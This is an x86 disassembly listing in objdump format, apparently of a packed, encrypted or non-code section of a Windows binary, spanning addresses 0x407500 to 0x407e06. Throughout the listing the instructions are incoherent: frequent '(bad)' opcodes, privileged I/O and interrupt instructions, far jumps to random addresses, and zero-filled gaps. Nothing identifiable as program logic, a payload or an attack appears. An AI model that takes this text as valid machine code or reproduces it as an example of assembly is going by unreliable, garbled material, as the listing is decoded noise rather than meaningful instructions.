  407500:	(bad)  
  407501:	call   0x2efa2867
  407506:	daa    
  407507:	jle    0x40748e
  407509:	adc    DWORD PTR [edi],esi
  40750b:	push   eax
  40750c:	call   DWORD PTR [ebx-0x216c2307]
  407512:	mov    eax,0x4654fe4f
  407517:	pop    eax
  407518:	inc    DWORD PTR [esi]
  40751a:	dec    edi
  40751b:	sbb    bh,BYTE PTR [edi]
  40751d:	sar    BYTE PTR [eax+0x73bde74f],1
  407523:	dec    edi
  407524:	jmp    DWORD PTR [eax+0xd]
  407527:	gs mul esi
  40752a:	add    BYTE PTR cs:[ebp-0xafd13f],0x39
  407532:	data16 jle 0x40756c
  407535:	sub    dh,dh
  407537:	dec    edi
  407538:	mov    ch,0xb9
  40753a:	mov    dh,0x4f
  40753c:	(bad)  
  40753d:	mov    esi,0x28290fec
  407542:	(bad)  
  407543:	pop    esp
  407544:	adc    DWORD PTR [ebx-0x5a],esi
  407547:	dec    edi
  407548:	or     ebp,DWORD PTR [ecx+0x5c82f235]
  40754e:	add    DWORD PTR [eax-0x1],ebx
  407551:	xchg   esi,eax
  407552:	xor    eax,0x98e09d8
  407557:	add    BYTE PTR [ebp+0xa5],0x0
	...
  40756a:	add    BYTE PTR [eax],al
  40756c:	mov    dh,0x4f
  40756e:	call   DWORD PTR [edx-0x6a7ab80d]
  407574:	(bad)  
  407575:	dec    edi
  407576:	call   esp
  407578:	stc    
  407579:	add    al,0x0
  40757b:	mov    ecx,0x5eb63291
  407580:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407581:	add    DWORD PTR [ebp-0xb1b9c7],0x36d7e1b9
  40758b:	add    BYTE PTR [edx+0x23b5ff02],dl
  407591:	sar    esi,0xff
  407594:	or     al,0xff
  407596:	sub    DWORD PTR ds:[edx+0x5acde802],esp
  40759d:	mov    ecx,0x3e130bfe
  4075a2:	adc    al,BYTE PTR [ebx-0x8edb2]
  4075a8:	cld    
  4075a9:	dec    ebp
  4075aa:	je     0x4075b6
  4075ac:	cld    
  4075ad:	icebp  
  4075ae:	mov    es,WORD PTR [ebp-0x13ef9]
  4075b4:	clc    
  4075b5:	sti    
  4075b6:	mov    BYTE PTR [ebp-0x13f19],0x93
  4075bd:	add    al,BYTE PTR [eax]
  4075bf:	add    bl,al
  4075c1:	mov    al,0x8d
  4075c3:	mov    dh,0x4c
  4075c5:	mov    dl,0x82
  4075c7:	mov    ebp,0xfffeaa37
  4075cc:	push   ebx
  4075cd:	ss add DWORD PTR ds:[eax],0x0
	...
  4075e2:	fimul  WORD PTR [edi+esi*8]
  4075e5:	dec    DWORD PTR [edi+eax*1+0x8b93675]
  4075ec:	lea    eax,[ebp-0x15571]
  4075f2:	add    esi,DWORD PTR [edx-0x4d6b1b4c]
  4075f8:	(bad)  
  4075f9:	call   0x3f945f
  4075fe:	sub    dl,al
  407600:	jae    0x40760b
  407602:	nop
  407603:	jae    0x4075d1
  407605:	test   DWORD PTR [ecx+esi*4-0x4cd98b01],0xb1a4e4b4
  407610:	(bad)  
  407611:	call   0x3fe259
  407616:	cli    
  407617:	push   ds
  407618:	mov    esp,esp
  40761a:	in     eax,0xbe
  40761c:	push   edx
  40761d:	add    dl,bh
  40761f:	pop    ebx
  407620:	add    eax,DWORD PTR [ebx-0xa53861]
  407626:	aad    0x5b
  407628:	xlat   BYTE PTR ds:[ebx]
  407629:	push   0x79
  40762b:	loopne 0x40768c
  40762d:	test   ebp,0x58740426
  407633:	fist   DWORD PTR [eax+0x52f6ade8]
  407639:	add    BYTE PTR [esi],ah
  40763b:	xchg   ebp,eax
  40763c:	fild   DWORD PTR [ecx]
  40763e:	cli    
  40763f:	not    BYTE PTR [ecx+0x5b5427ff]
  407645:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
	...
  407656:	add    BYTE PTR [eax],al
  407658:	dec    eax
  407659:	push   esi
  40765a:	push   edx
  40765b:	inc    DWORD PTR [edi+0x4f]
  40765e:	pop    edx
  40765f:	inc    DWORD PTR [ebp-0x6df8279a]
  407665:	bound  edx,QWORD PTR [ebp-0x67c98a01]
  40766b:	call   0xff92b4d5
  407670:	out    dx,eax
  407671:	push   ebx
  407672:	pop    ebx
  407673:	in     eax,dx
  407674:	test   al,0x8e
  407676:	push   edx
  407677:	dec    DWORD PTR [edi+0x4dff5aa7]
  40767d:	sahf   
  40767e:	cwde   
  40767f:	in     al,0x4d
  407681:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407682:	push   edx
  407683:	inc    edi
  407685:	push   ebx
  407686:	pop    ebx
  407687:	lods   eax,DWORD PTR ds:[esi]
  407688:	push   0x67ff5276
  40768d:	lahf   
  40768e:	pop    edx
  40768f:	jmp    DWORD PTR ds:0x1207d886
  407695:	hlt    
  407696:	xchg   ebp,eax
  407697:	call   DWORD PTR ds:0x5e097d6
  40769d:	ficom  WORD PTR [ecx-0x1]
  4076a0:	pop    DWORD PTR [ecx+esi*8]
  4076a3:	pop    ebx
  4076a4:	aas    
  4076a5:	xchg   edx,eax
  4076a6:	pop    esi
  4076a7:	push   edx
  4076a8:	cmc    
  4076a9:	xchg   edx,eax
  4076aa:	dec    ebp
  4076ab:	pop    edx
  4076ac:	in     eax,dx
  4076ad:	dec    esp
  4076ae:	inc    ecx
  4076af:	dec    edx
  4076b0:	scas   eax,DWORD PTR es:[edi]
  4076b1:	dec    esp
  4076b2:	inc    esi
  4076b3:	push   edx
  4076b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076b5:	pop    ecx
  4076b6:	ss push edx
  4076b8:	aad    0x5d
  4076ba:	jne    0x407654
	...
  4076cc:	add    BYTE PTR [eax],al
  4076ce:	int    0x4c
  4076d0:	cs cwde 
  4076d2:	rcl    BYTE PTR [esi+eiz*1+0x52],cl
  4076d6:	rcl    BYTE PTR [esi+0x4cb55254],cl
  4076dc:	pop    esp
  4076dd:	arpl   WORD PTR [ebp+0x5c5b0e4c],sp
  4076e3:	xchg   edx,eax
  4076e4:	push   es
  4076e5:	push   edx
  4076e6:	popf   
  4076e7:	xchg   edx,eax
  4076e8:	stc    
  4076e9:	pop    ecx
  4076ea:	xchg   ebp,eax
  4076eb:	dec    esp
  4076ec:	add    DWORD PTR [esi+0x47],ebp
  4076ef:	dec    esp
  4076f0:	out    dx,al
  4076f1:	push   ecx
  4076f2:	aas    
  4076f3:	dec    ebp
  4076f4:	rcl    BYTE PTR [edi+edi*2-0x10ae21b4],1
  4076fb:	dec    eax
  4076fc:	shl    DWORD PTR [edi+0x75],0x5
  407700:	jmp    0xe93daf3f
  407705:	mov    dh,0x70
  407707:	pop    ecx
  407708:	push   0x48
  40770a:	dec    esi
  40770b:	fucomip st,st(0)
  40770d:	(bad)  
  40770f:	dec    ebx
  407710:	xor    al,0xfc
  407712:	pop    ebp
  407713:	call   0x5024:0x7e3d515b
  40771a:	mov    ds:0x6c60e904,al
  40771f:	fstp   QWORD PTR [eax+0x1104bb1a]
  407725:	dec    edi
  407726:	in     al,0xc5
  407728:	call   0x3d067d
  40772d:	and    BYTE PTR ds:0x6eff2e,0x0
	...
  407744:	test   ecx,eax
  407746:	idiv   DWORD PTR [ecx-0x57c93cdf]
  40774c:	stc    
  40774d:	fmul   QWORD PTR [edx]
  40774f:	push   ds
  407750:	mov    ecx,0xb14fe4b
  407755:	push   ds
  407756:	inc    ecx
  407757:	jmp    0x3ef8269d
  40775c:	sub    eax,DWORD PTR [eax]
  40775e:	sar    BYTE PTR [ebp+0x35457e23],0xa6
  407765:	add    al,0x0
  407767:	push   ss
  407768:	push   0x51f1754b
  40776d:	xchg   esp,eax
  40776e:	mov    cl,0x16
  407770:	dec    ebx
  407771:	dec    esp
  407772:	jne    0x407785
  407774:	dec    ebx
  407775:	shl    bl,cl
  407777:	push   es
  407778:	lds    eax,FWORD PTR [ebx]
  40777a:	call   0xff8be09d
  40777f:	mul    BYTE PTR [edi+edx*2+0x4b6cd1e8]
  407786:	call   DWORD PTR [ecx-0x45]
  407789:	adc    al,BYTE PTR [ecx-0x17]
  40778c:	retf   0x7d1
  40778f:	ror    ebx,0x48
  407792:	dec    esi
  407794:	retf   0xfbd1
  407797:	mov    BYTE PTR [ebx+eax*1-0x18],0x3f
  40779c:	ins    BYTE PTR es:[edi],dx
  40779d:	dec    ebx
  40779e:	jmp    DWORD PTR [eax+0x140000b7]
  4077a4:	(bad)  
  4077a5:	pop    eax
  4077a6:	sub    DWORD PTR [ebp+0x0],0x0
	...
  4077b9:	add    BYTE PTR [ebp-0x4ed0022],ch
  4077bf:	dec    ebx
  4077c0:	jne    0x4077a3
  4077c2:	shl    DWORD PTR [esi],1
  4077c4:	mov    dl,0x8e
  4077c6:	retf   0x457d
  4077c9:	add    BYTE PTR [edi+0x2f],dh
  4077cc:	(bad)  
  4077cd:	inc    DWORD PTR [ebp+esi*2+0x464ca068]
  4077d4:	jmp    DWORD PTR [edi-0x39]
  4077d7:	in     al,dx
  4077d8:	inc    eax
  4077d9:	add    BYTE PTR [edx+esi*1+0x1f49e807],dl
  4077e0:	(bad)  
  4077e1:	inc    DWORD PTR [ebx+esi*1-0x5]
  4077e5:	dec    esi
  4077e7:	dec    esi
  4077e8:	out    0x43,eax
  4077ea:	popa   
  4077eb:	mov    ch,0xfe
  4077ed:	leave  
  4077ee:	and    DWORD PTR [edx],eax
  4077f0:	add    BYTE PTR [ebp+0x58],dl
  4077f3:	stos   BYTE PTR es:[edi],al
  4077f4:	add    ah,0x17
  4077f7:	sub    bh,bh
  4077f9:	imul   eax,ebx,0xb0874b5
  4077ff:	fnsave [eax+0x44cf04ff]
  407805:	cld    
  407806:	jnp    0x40780e
  407808:	add    bh,ch
  40780a:	xor    eax,0x6237b52e
  40780f:	push   es
  407810:	push   0xff474cbb
  407815:	dec    BYTE PTR [esi]
  407817:	dec    esi
  407818:	out    0xaf,eax
  40781a:	mov    edx,0x6afeba
	...
  40782f:	add    BYTE PTR [ebx+0x2e],ah
  407832:	div    DWORD PTR [edi]
  407834:	and    al,BYTE PTR [ecx]
  407836:	push   0xff400cde
  40783b:	(bad)  
  40783c:	pop    esi
  40783d:	sti    
  40783e:	sub    BYTE PTR [ecx+0x63],al
  407841:	scas   al,BYTE PTR es:[edi]
  407842:	xchg   ebp,eax
  407843:	mov    bh,0x84
  407845:	mov    edx,0x1d0fc00a
  40784a:	push   0xff411cd4
  40784f:	dec    edi
  407850:	mov    esp,DWORD PTR [edi-0x49]
  407853:	(bad)  
  407854:	cli    
  407855:	jb     0x40780b
  407857:	addr16 cli 
  407859:	pop    ebx
  40785a:	pop    esi
  40785b:	mov    esi,0x41170992
  407860:	cli    
  407861:	jmp    0x4078b1
  407863:	jne    0x407867
  407865:	test   BYTE PTR [edx],bl
  407867:	fld    DWORD PTR ds:0x46565bdb
  40786d:	jecxz  0x4078bd
  40786f:	jmp    FWORD PTR [edi-0x58]
  407872:	dec    esi
  407873:	jne    0x407877
  407875:	les    edi,FWORD PTR [ecx+esi*4]
  407878:	in     eax,0xba
  40787a:	cmp    al,0xc2
  40787c:	neg    BYTE PTR [ebx-0x48]
  40787f:	mov    ah,dh
  407881:	fiadd  WORD PTR [edi-0x4]
  407884:	and    al,0x6b
  407886:	fcos   
  407888:	push   ebx
  407889:	sub    eax,0xf3f2754e
  40788e:	fidiv  DWORD PTR [eax+0x457ceab5]
	...
  4078a4:	add    BYTE PTR [eax],al
  4078a6:	scas   al,BYTE PTR es:[edi]
  4078a7:	out    0x18,al
  4078a9:	pop    eax
  4078aa:	rcr    BYTE PTR [ebx+eax*1+0x1b9fdf8b],cl
  4078b1:	inc    ecx
  4078b2:	cli    
  4078b3:	fisttp DWORD PTR [esi]
  4078b5:	add    BYTE PTR [esi],al
  4078b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078b8:	fild   DWORD PTR [ebx]
  4078ba:	ret    0x39c
  4078bd:	push   edi
  4078be:	xchg   edx,eax
  4078bf:	imul   eax,DWORD PTR [ebp+0x4356fa00],0x74
  4078c6:	pop    ss
  4078c7:	or     bl,BYTE PTR [ebx+edx*8-0x59]
  4078cb:	cmp    cl,BYTE PTR [esi+0x68]
  4078ce:	out    dx,eax
  4078cf:	add    eax,ebp
  4078d1:	inc    ebp
  4078d3:	xor    edx,DWORD PTR [ecx-0x49]
  4078d6:	dec    ebp
  4078d7:	xchg   edx,eax
  4078d8:	mov    bl,0x67
  4078da:	cli    
  4078db:	pop    ebx
  4078dc:	pop    esi
  4078dd:	mov    esi,0xd8a604aa
  4078e2:	std    
  4078e3:	pop    esp
  4078e4:	ret    
  4078e5:	cmp    BYTE PTR ds:0x695a8149,ch
  4078eb:	dec    ecx
  4078ec:	mov    ds,WORD PTR [edx-0x5]
  4078ef:	ret    0xd68
  4078f2:	cli    
  4078f3:	iret   
  4078f4:	add    ch,0x11
  4078f7:	adc    eax,0x49058ca9
  4078fc:	outs   dx,BYTE PTR ds:[esi]
  4078fd:	dec    esi
  4078fe:	or     BYTE PTR [edx-0x6d90f8df],bl
  407904:	pop    esi
  407905:	fdiv   st,st(1)
  407907:	dec    eax
  407908:	fdiv   st(3),st
	...
  40791a:	add    BYTE PTR [eax],al
  40791c:	ffree  st(0)
  40791e:	xchg   edi,eax
  40791f:	dec    esi
  407920:	(bad)  [eax+0x1b83ca6]
  407926:	jmp    0x6a99f9e3
  40792b:	inc    edi
  40792c:	(bad)  
  40792d:	fucomi st,st(0)
  40792f:	fldpi  
  407931:	inc    edi
  407932:	pushf  
  407933:	sti    
  407934:	popf   
  407935:	pop    esi
  407936:	pop    ecx
  407937:	dec    esi
  407938:	lods   eax,DWORD PTR ds:[esi]
  407939:	jle    0x4078e7
  40793b:	dec    edi
  40793c:	adc    al,BYTE PTR ds:0xdd5c5ee9
  407942:	(bad)  
  407943:	or     edi,DWORD PTR [ebx]
  407945:	add    eax,0xc5c5eb91
  40794a:	call   0x13d889d
  40794f:	xchg   esp,eax
  407950:	mov    ds:0xef4de648,al
  407955:	dec    eax
  407956:	(bad)  
  407958:	cmc    
  407959:	pop    esp
  40795a:	jecxz  0x4078ee
  40795c:	gs dec eax
  40795e:	mov    al,ds:0x1c04f642
  407963:	jns    0x4079cb
  407965:	xchg   BYTE PTR [ebp+0x484530],ah
  40796b:	mov    dh,0xc5
  40796d:	sar    ebx,0x19
  407970:	scas   eax,DWORD PTR es:[edi]
  407971:	ror    DWORD PTR [ebx],1
  407973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407974:	or     eax,0xf6282908
  407979:	pop    esp
  40797a:	int    0x6c
  40797c:	inc    BYTE PTR [ebx+ecx*1]
  40797f:	test   eax,0x0
	...
  407990:	add    BYTE PTR [eax],al
  407992:	pop    ds
  407993:	and    DWORD PTR [ecx-0x38fb0618],0x4be24
  40799d:	jmp    0x7585b99b
  4079a2:	scas   eax,DWORD PTR es:[edi]
  4079a3:	(bad)  
  4079a4:	(bad)  
  4079a5:	call   0xe9a9c17d
  4079aa:	rol    DWORD PTR [edi+0x69],cl
  4079ad:	jmp    0xba343c16
  4079b2:	pop    esp
  4079b3:	xor    ah,0x3e
  4079b6:	inc    edi
  4079b7:	dec    eax
  4079b8:	push   eax
  4079b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079bb:	dec    edi
  4079bc:	(bad)  
  4079bd:	mov    esp,0x649f5d35
  4079c2:	test   BYTE PTR [ebx+ecx*1],0x29
  4079c6:	rol    BYTE PTR [eax],cl
  4079c8:	jmp    0x457252
  4079cd:	or     DWORD PTR [ecx+0x2ee9411c],0x38110bd2
  4079d7:	(bad)  
  4079d8:	(bad)  
  4079d9:	dec    BYTE PTR [ecx+0x7a]
  4079dc:	shl    BYTE PTR [ebp+edi*2+0x50],1
  4079e0:	imul   esi
  4079e2:	cs mov ch,0x51
  4079e5:	ror    DWORD PTR [ebx-0xf210072],1
  4079eb:	xor    eax,0xe847b6de
  4079f1:	loope  0x40797d
  4079f3:	inc    edi
  4079f4:	inc    DWORD PTR [eax]
	...
  407a06:	add    BYTE PTR [eax],al
  407a08:	test   eax,0xfb3e6800
  407a0d:	inc    ebx
  407a0e:	(bad)  
  407a0f:	inc    dh
  407a11:	mov    bl,0xf6
  407a13:	dec    DWORD PTR [eax+edi*4+0x424a3f34]
  407a1a:	jmp    edi
  407a1c:	sub    esi,DWORD PTR [ecx-0x1]
  407a1f:	call   FWORD PTR [edx+0x6cf7e47e]
  407a25:	mov    eax,0xe6eb0069
  407a2a:	aaa    
  407a2b:	inc    ecx
  407a2c:	and    edi,DWORD PTR [eax-0x477b0f4c]
  407a32:	(bad)  
  407a33:	inc    DWORD PTR [esi-0x8]
  407a36:	sub    BYTE PTR [ecx-0x1d],al
  407a39:	stos   BYTE PTR es:[edi],al
  407a3a:	jmp    0x88f9c6f4
  407a3f:	test   DWORD PTR [edi],edi
  407a41:	mov    cl,0xfe
  407a43:	(bad)  
  407a44:	mov    ecx,0xfb356802
  407a49:	inc    ecx
  407a4a:	(bad)  
  407a4b:	inc    BYTE PTR [esi-0x4e]
  407a4e:	idiv   bh
  407a50:	or     al,0xb9
  407a52:	xor    al,0x3f
  407a54:	cli    
  407a55:	inc    ecx
  407a56:	jmp    edi
  407a58:	out    dx,eax
  407a59:	outs   dx,BYTE PTR ds:[esi]
  407a5a:	(bad)  
  407a5b:	jmp    FWORD PTR [edx]
  407a5d:	jg     0x407a47
  407a5f:	test   DWORD PTR [ecx+edi*4],0xb0cf858c
  407a66:	(bad)  
  407a67:	push   DWORD PTR [ebx+0x2a]
  407a6a:	inc    esi
  407a6b:	cmp    BYTE PTR [eax],al
	...
  407a7d:	add    BYTE PTR [edx+0x2],ah
  407a80:	push   DWORD PTR [ebp-0x14d7d]
  407a86:	mov    eax,?
  407a88:	sub    DWORD PTR ds:[edx],esp
  407a8b:	add    eax,ebp
  407a8d:	test   eax,0xbfeba86
  407a92:	cli    
  407a93:	fwait
  407a94:	rcr    BYTE PTR [eax],1
  407a96:	jns    0x407b11
  407a98:	sub    bh,dh
  407a9a:	push   ebp
  407a9b:	aas    
  407a9c:	add    BYTE PTR [ebp-0x16],dh
  407a9f:	xchg   BYTE PTR [edi+ecx*4],dl
  407aa2:	jg     0x407ae0
  407aa4:	push   ebx
  407aa5:	(bad)  
  407aa6:	cmp    eax,0x68765bec
  407aab:	lahf   
  407aac:	dec    ebx
  407aad:	jmp    0x407ab5
  407aaf:	push   ebx
  407ab0:	inc    ebx
  407ab1:	je     0x407aaf
  407ab3:	or     ebx,DWORD PTR [edx+ebp*2+0x68]
  407ab7:	ja     0x407b04
  407ab9:	(bad)  
  407aba:	jg     0x407b38
  407abc:	push   ebx
  407abd:	dec    DWORD PTR ds:0xfa000331
  407ac3:	fimul  DWORD PTR [eax+0x4ad705e4]
  407ac9:	add    BYTE PTR [esi-0x79],ch
  407acc:	xchg   BYTE PTR [ebp-0xb55122],bh
  407ad2:	cli    
  407ad3:	daa    
  407ad4:	mov    ecx,0x52c39f82
  407ad9:	call   ebp
  407adb:	pop    ebx
  407adc:	iret   
  407add:	inc    esp
  407ade:	bound  ebx,QWORD PTR [ebx+eax*1-0x11]
	...
  407af2:	add    BYTE PTR [eax],al
  407af4:	test   BYTE PTR [esi],cl
  407af6:	rol    DWORD PTR [edi],1
  407af8:	rcr    BYTE PTR [edx+ebx*4],cl
  407afb:	push   DWORD PTR [ebp-0x5a136ee2]
  407b01:	out    0x4a,al
  407b03:	jmp    FWORD PTR [edi]
  407b05:	fs pop ebx
  407b07:	adc    eax,0xff4af64d
  407b0c:	dec    edi
  407b0d:	repz push edx
  407b0f:	dec    DWORD PTR [ebp-0x6df82fba]
  407b15:	push   esi
  407b16:	call   0x6de4:0x90567dff
  407b1d:	add    al,0xe6
  407b1f:	dec    edx
  407b20:	ins    DWORD PTR es:[edi],dx
  407b21:	iret   
  407b22:	lock pop ebx
  407b24:	arpl   WORD PTR [esi-0x70a2b52a],dx
  407b2a:	leave  
  407b2b:	push   edx
  407b2c:	push   ebp
  407b2d:	inc    ebp
  407b2e:	(bad)  
  407b2f:	shl    ch,1
  407b31:	pop    esp
  407b32:	jo     0x407acd
  407b34:	inc    ebp
  407b35:	inc    ebp
  407b36:	mov    dh,0x90
  407b38:	push   esi
  407b39:	dec    ebp
  407b3a:	scas   al,BYTE PTR es:[edi]
  407b3b:	dec    edx
  407b3c:	and    cl,BYTE PTR [edi+0x58]
  407b3f:	dec    edx
  407b40:	sub    eax,0x2d575445
  407b45:	inc    ebp
  407b46:	xchg   esi,eax
  407b47:	pop    ebx
  407b48:	adc    BYTE PTR [ebx-0x70eab572],dl
  407b4e:	xchg   ecx,eax
  407b4f:	push   edx
  407b50:	or     eax,0x4b2a9145
  407b55:	inc    ebp
  407b56:	jbe    0x407ba2
	...
  407b68:	add    BYTE PTR [eax],al
  407b6a:	inc    edi
  407b6b:	push   esp
  407b6c:	jbe    0x407bb8
  407b6e:	cmc    
  407b6f:	sub    eax,0x44ed943d
  407b74:	pop    esi
  407b75:	shr    ch,0x2e
  407b78:	(bad)  
  407b79:	dec    ecx
  407b7a:	fld    QWORD PTR [esi+ecx*2-0x30]
  407b7e:	shr    DWORD PTR ds:0x4fa7fe7,1
  407b84:	xor    BYTE PTR [ebp-0xe],al
  407b87:	add    al,0x9c
  407b89:	jle    0x407b59
  407b8b:	mov    BYTE PTR ds:0x93052047,ah
  407b91:	imul   BYTE PTR [edx+edi*4+0x739c5bf0]
  407b98:	push   ss
  407b99:	dec    edx
  407b9a:	jae    0x407b66
  407b9c:	or     al,0xdb
  407b9e:	inc    esp
  407b9f:	std    
  407ba0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ba1:	add    ecx,DWORD PTR [ebp-0x13a40f46]
  407ba7:	inc    edx
  407ba8:	add    dh,dh
  407baa:	xor    eax,DWORD PTR [ebp+esi*2-0x13]
  407bae:	ret    
  407baf:	mov    ecx,0x7369d107
  407bb4:	(bad)  
  407bb5:	fisub  WORD PTR [ecx]
  407bb7:	inc    edi
  407bb8:	add    al,0xe9
  407bba:	mov    WORD PTR [edi+0x40ba6aec],cs
  407bc0:	push   0xffffffe9
  407bc2:	das    
  407bc3:	sbb    bh,bh
  407bc5:	xor    al,0x46
  407bc7:	sub    al,0xb5
  407bc9:	xchg   DWORD PTR [ebx+0x248943],esi
	...
  407bdf:	add    dl,al
  407be1:	lods   al,BYTE PTR ds:[esi]
  407be2:	(bad)  
  407be3:	call   0x20a8feba
  407be8:	test   ch,0xff
  407beb:	add    BYTE PTR [ebx-0x4],al
  407bee:	inc    eax
  407bef:	jmp    0x914835b6
  407bf4:	xor    eax,0xb37eff5a
  407bf9:	mov    ecx,0xc2d76fb
  407bfe:	call   0xff840c9a
  407c03:	xor    BYTE PTR [ecx+ecx*1],dh
  407c06:	add    BYTE PTR [esi+eiz*2+0xe2d8131],dh
  407c0d:	cmp    al,0xff
  407c0f:	dec    esi
  407c10:	dec    ebp
  407c11:	retf   0x99fb
  407c14:	inc    edx
  407c15:	mov    edx,0x3f53e0b
  407c1a:	sub    DWORD PTR [eax+0x6a992cf9],ebp
  407c20:	inc    BYTE PTR [ebx+ecx*1]
  407c23:	sub    DWORD PTR [ebx-0x6173278],esi
  407c29:	add    al,0xc7
  407c2b:	lods   al,BYTE PTR ds:[esi]
  407c2c:	xor    DWORD PTR ds:0x4bf9e900,eax
  407c32:	inc    ebp
  407c33:	add    BYTE PTR [edi-0x6cfff934],cl
  407c39:	popa   
  407c3a:	jmp    FWORD PTR [ecx-0x6d]
  407c3d:	popa   
  407c3e:	jmp    FWORD PTR [ecx+0x63]
  407c41:	mov    edx,0xf444
	...
  407c56:	xor    edi,DWORD PTR [esp+eax*4-0x133b30c]
  407c5d:	push   eax
  407c5e:	inc    esp
  407c5f:	push   edx
  407c60:	idiv   edi
  407c62:	scas   al,BYTE PTR es:[edi]
  407c63:	int3   
  407c64:	out    0x6b,eax
  407c66:	loopne 0x407c6f
  407c68:	add    BYTE PTR [ebx],cl
  407c6a:	xchg   ebx,eax
  407c6b:	push   ebx
  407c6c:	add    al,0xe9
  407c6e:	mov    ds:0xbb000006,eax
  407c73:	cwde   
  407c74:	sub    BYTE PTR [ecx+0x23],al
  407c77:	int3   
  407c78:	je     0x407c86
  407c7a:	mov    edi,DWORD PTR [ebp+0x7784ffb3]
  407c80:	mov    dl,al
  407c82:	mov    dh,0xc2
  407c84:	repz div DWORD PTR [esp+ecx*8+0x4f]
  407c89:	push   edx
  407c8a:	imul   ecx,DWORD PTR [ebp-0x4d],0xffffffff
  407c8e:	test   BYTE PTR [esi-0x32930f7c],bh
  407c94:	(bad)  
  407c95:	call   0x4012c9
  407c9a:	push   esi
  407c9b:	ret    
  407c9c:	xlat   BYTE PTR ds:[ebx]
  407c9d:	test   DWORD PTR [ebp+ecx*8+0x4f],0x410e4c68
  407ca5:	add    BYTE PTR [ebx+edx*4],dh
  407ca8:	lock test DWORD PTR [ecx*8+0x1fc435fe],0xfd3b0041
  407cb4:	mov    dl,0xff
  407cb6:	aam    0xbe
  407cb8:	test   ah,ah
	...
  407cca:	add    BYTE PTR [eax],al
  407ccc:	or     al,0xcd
  407cce:	(bad)  
  407ccf:	push   0xfffffffa
  407cd1:	sub    ebx,ebx
  407cd3:	test   dl,dl
  407cd5:	ins    BYTE PTR es:[edi],dx
  407cd6:	add    edi,edi
  407cd8:	inc    edi
  407cd9:	cmp    al,0x4f
  407cdb:	inc    DWORD PTR [ebp-0x2cc0f2bd]
  407ce1:	ins    BYTE PTR es:[edi],dx
  407ce2:	add    ebp,eax
  407ce4:	stos   DWORD PTR es:[edi],eax
  407ce5:	inc    DWORD PTR [edi-0x1]
  407ce8:	xor    DWORD PTR [ecx+0x6365f757],0xffffffda
  407cef:	call   ebp
  407cf1:	test   eax,0x52fa410b
  407cf6:	xchg   ecx,eax
  407cf7:	lock inc ebp
  407cf9:	dec    ebx
  407cfa:	inc    edi
  407cfb:	dec    DWORD PTR [edi]
  407cfd:	inc    ebx
  407cfe:	sbb    al,0x41
  407d00:	cli    
  407d01:	inc    ebx
  407d02:	jae    0x407cb7
  407d04:	xor    eax,0x22857d73
  407d09:	mov    ds:0xa977ff47,eax
  407d0e:	daa    
  407d0f:	neg    DWORD PTR ds:0x5a67b49b
  407d15:	push   esp
  407d16:	(bad)  
  407d17:	dec    DWORD PTR [ecx+eax*1]
  407d1a:	push   esp
  407d1b:	test   DWORD PTR ds:0xbd3546c3,0xddffc444
  407d25:	cmp    edx,DWORD PTR [edx+0x4336edff]
  407d2b:	je     0x407d30
  407d2d:	scas   eax,DWORD PTR es:[edi]
  407d2e:	mov    ah,bl
	...
  407d40:	add    BYTE PTR [eax],al
  407d42:	in     eax,0xda
  407d44:	inc    esi
  407d45:	add    al,0x4f
  407d47:	cmp    al,0x46
  407d49:	xor    BYTE PTR [ebp-0x50],bh
  407d4c:	arpl   di,si
  407d4e:	lds    eax,FWORD PTR [edx]
  407d50:	mov    ah,0xe7
  407d52:	(bad)  
  407d53:	mov    ebx,0x57a1ff46
  407d58:	cli    
  407d59:	mov    edi,0xb3ef0526
  407d5e:	popf   
  407d5f:	repz pop eax
  407d61:	inc    edi
  407d62:	popf   
  407d63:	dec    ecx
  407d64:	ins    BYTE PTR es:[edi],dx
  407d65:	lea    eax,fs:[ecx+0xe]
  407d69:	icebp  
  407d6a:	lea    eax,[ecx-0x17]
  407d6d:	add    BYTE PTR [edi+0x28],0xf6
  407d71:	inc    esi
  407d72:	jge    0x407d78
  407d74:	jge    0x407d3b
  407d76:	js     0x407df7
  407d78:	std    
  407d79:	dec    esi
  407d7a:	ins    DWORD PTR es:[edi],dx
  407d7b:	inc    ecx
  407d7c:	jmp    0x9cc66c50
  407d81:	pop    ebx
  407d82:	gs inc ecx
  407d84:	(bad)  
  407d85:	add    ecx,esi
  407d87:	mov    al,0x42
  407d89:	add    al,0x7f
  407d8b:	xchg   DWORD PTR [ecx+0x1941454e],esp
  407d91:	inc    edi
  407d92:	xchg   DWORD PTR [eax],ebp
  407d94:	mov    esi,0x1b2c3546
  407d99:	xor    DWORD PTR ds:0xae43f241,ebp
  407d9f:	fsubr  DWORD PTR [ecx-0x78]
  407da2:	inc    edx
  407da3:	cmp    DWORD PTR [esi+0x46],edx
	...
  407db5:	add    BYTE PTR [eax],al
  407db7:	add    dl,bh
  407db9:	mov    eax,0x410ddc21
  407dbe:	xchg   esi,eax
  407dbf:	test   DWORD PTR ds:0x955bf0b7,eax
  407dc5:	jo     0x407e3d
  407dc7:	inc    esi
  407dc8:	cmc    
  407dc9:	jp     0x407e48
  407dcb:	dec    esi
  407dcc:	in     eax,dx
  407dcd:	inc    eax
  407dce:	data16 sar ch,1
  407dd1:	sub    al,0xa2
  407dd3:	xchg   edi,eax
  407dd4:	fld    QWORD PTR [eax+0x56]
  407dd7:	nop
  407dd8:	loop   0x407e12
  407dda:	dec    esi
  407ddb:	inc    esi
  407ddc:	int    0xba
  407dde:	lock pop ebx
  407de0:	xchg   edi,eax
  407de1:	jno    0x407e21
  407de3:	inc    esi
  407de4:	mov    ebp,0x4411007a
  407de9:	inc    eax
  407dea:	jmp    FWORD PTR [esi]
  407dec:	mov    ch,BYTE PTR [ecx]
  407dee:	mul    DWORD PTR [esi]
  407df0:	cmp    al,0x40
  407df2:	jne    0x407de5
  407df4:	inc    ecx
  407df5:	mov    dl,0xab
  407df7:	push   ss
  407df8:	cmp    al,0x40
  407dfa:	mov    ch,0x9
  407dfc:	cmp    al,0x40
  407dfe:	inc    DWORD PTR [esi]
  407e00:	stos   BYTE PTR es:[edi],al
  407e01:	or     al,ch
  407e03:	shl    BYTE PTR [ebp+0x40],1
  407e06:	push   esi
